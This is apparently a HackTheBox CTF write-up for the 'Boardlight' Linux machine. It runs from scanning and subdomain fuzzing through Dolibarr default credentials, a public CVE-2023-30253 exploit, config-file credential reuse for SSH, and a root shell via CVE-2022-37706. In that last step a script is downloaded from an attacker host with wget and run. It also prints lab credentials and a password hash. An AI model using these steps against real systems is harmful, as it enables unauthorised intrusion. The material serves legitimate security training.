---
title: "Boardlight"
date: 2026-03-01
draft: false
description: "HackTheBox Boardlight writeup"
tags: ["hackthebox", "htb", "linux", "easy", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Boardlight

## Overview

- **OS:** Linux
- **IP:** 10.129.231.37
- **Difficulty:** Easy
- **Platform:** HackTheBox
- **OSCP:** Yes
- **Lists:** N/A

### Summary

Got in through discovered subdomain with a exploit, escalated w conf file cred reuse, and then esc to root using known exploit.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames | $dolibarr_main_db_user='dolibarrowner'; , larissa |
| Passwords | $dolibarr_main_db_pass='serverfun2$2023!!';
 |
| Usernames+Passwords | larissa:serverfun2$2023!! |
| Hashes | dollibar:$2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm |
| Service Versions |  |

## Enumeration

## Nmap

```
──(kali㉿kali)-[~/Desktop/vpn]
└─$ nmap 10.129.231.37 -sCV -p- -Pn --min-rate=20000      
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-01 15:04 EST
Nmap scan report for boardlight.htb (10.129.231.37)
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.09 seconds
                                                                        
```

## Dirbusting

```
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
**301      GET        9l       28w      313c http://boardlight.htb/js => http://boardlight.htb/js/**
301      GET        9l       28w      314c http://boardlight.htb/css => http://boardlight.htb/css/
301      GET        9l       28w      317c http://boardlight.htb/images => http://boardlight.htb/images/
200      GET        5l       48w     1493c http://boardlight.htb/images/fb.png
200      GET        5l       55w     1797c http://boardlight.htb/images/linkedin.png
200      GET        7l       48w     3995c http://boardlight.htb/images/d-5.png
200      GET        6l       12w      491c http://boardlight.htb/images/user.png
200      GET        5l       14w     1227c http://boardlight.htb/images/insta.png
200      GET      294l      635w     9426c http://boardlight.htb/contact.php
200      GET        3l       10w      667c http://boardlight.htb/images/telephone-white.png
**200      GET      294l      633w     9209c http://boardlight.htb/do.php**
404      GET        1l        3w       16c http://boardlight.htb/portfolio.php
200      GET      517l     1053w    15949c http://boardlight.htb/index.php
200      GET      100l      178w     1904c http://boardlight.htb/css/responsive.css
200      GET        5l       23w     1217c http://boardlight.htb/images/location-white.png
200      GET        5l       12w      847c http://boardlight.htb/images/envelope-white.png
200      GET      280l      652w     9100c http://boardlight.htb/about.php
200      GET        6l       52w     1968c http://boardlight.htb/images/twitter.png
200      GET       11l       50w     2892c http://boardlight.htb/images/d-1.png
200      GET      714l     1381w    13685c http://boardlight.htb/css/style.css
200      GET        9l       24w     2405c http://boardlight.htb/images/d-2.png
200      GET        6l       57w     1878c http://boardlight.htb/images/youtube.png
200      GET      348l     2369w   178082c http://boardlight.htb/images/map-img.png
200      GET      536l     2364w   201645c http://boardlight.htb/images/who-img.jpg
200      GET     4437l    10973w   131639c http://boardlight.htb/js/bootstrap.js
200      GET    10038l    19587w   192348c http://boardlight.htb/css/bootstrap.css
200      GET        2l     1276w    88145c http://boardlight.htb/js/jquery-3.4.1.min.js
200      GET      517l     1053w    15949c http://boardlight.htb/
```

## Subd

```
 wfuzz -u http://board.htb/ -H "Host: FUZZ.board.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  --hw 1053    
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://board.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                    
=====================================================================

**000000072:   200        149 L    504 W      6360 Ch     "crm"** 
```

## Port 80

Web behavior was the main signal here, so I traced each response change before exploitation.

{{< figure src="image 455.png" >}}

lets add this

### crm.board.htb

I validated this step using the evidence below before moving forward in the chain.

{{< figure src="image 456.png" >}}

### Robots.txt for crm

I validated this step using the evidence below before moving forward in the chain.

{{< figure src="image 457.png" >}}

## Exploitation

## Dollibar Default Creds admin:admin

{{< figure src="image 458.png" >}}

[https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253)

lets just try this exploit

{{< figure src="image 459.png" >}}

jsut like that we have our shell

so mysql is running 

{{< figure src="image 460.png" >}}

we find the db creds here

```
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
```

using these creds we find this in the db

```
dolibarr
$2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm

```

and another admin user, but dollibar has last name as superadmin and the admin value set to 1 so lets try cracking this one instead

while that cracks lets see if we can reuse these creds

and oh we got access as the user larissa via ssh

we come across these files

{{< figure src="image 461.png" >}}

lets check the CVE its mentioning

```

larissa@boardlight:/tmp$ wget http://10.10.14.137:8080/exploit.sh -o exploit.sh
larissa@boardlight:/tmp$ chmod +x exploit.sh
larissa@boardlight:/tmp$ ./exploit.sh
./exploit.sh: line 1: --2026-03-02: command not found
./exploit.sh: line 2: Connecting: command not found
./exploit.sh: line 3: HTTP: command not found
./exploit.sh: line 4: Length:: command not found
./exploit.sh: line 5: Saving: command not found
./exploit.sh: line 7: 0K: command not found
./exploit.sh: line 9: syntax error near unexpected token `('
./exploit.sh: line 9: `2026-03-02 04:03:52 (1.13 MB/s) - ‘exploit.sh.1’ saved [709/709]'
larissa@boardlight:/tmp$ ./exploit.sh.1
-bash: ./exploit.sh.1: Permission denied
larissa@boardlight:/tmp$ chmod +x exploit.sh.1
larissa@boardlight:/tmp$ ./exploit.sh.1
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
## whoami
root
## 
```

and boom we r done
